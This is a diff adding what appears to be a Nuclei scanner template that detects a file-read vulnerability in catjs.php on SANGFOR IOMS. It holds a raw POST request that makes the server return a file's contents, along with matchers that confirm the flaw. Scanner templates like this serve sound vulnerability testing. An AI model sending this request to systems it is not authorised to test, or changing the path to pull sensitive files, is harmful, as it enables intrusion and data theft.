@@ -1,0 +1,35 @@
+id: sangfor-ioms-catjs-file-read
+
+info:
+  name: SANGFOR-IOMS catjs.php File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The SANGFOR Internet Optimization Management System (IOMS) has a file-read vulnerability in `catjs.php`. Exploiting this allows attackers to download server files, leading to sensitive information leakage.
+  tags: file-read
+
+variables:
+  filePath: "./php/catjs.php"
+
+http:
+  - raw:
+      - |
+        POST /php/catjs.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ["{{filePath}}"]
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/x-javascript"
+      - type: word
+        part: body
+        words:
+          - "file_get_contents"
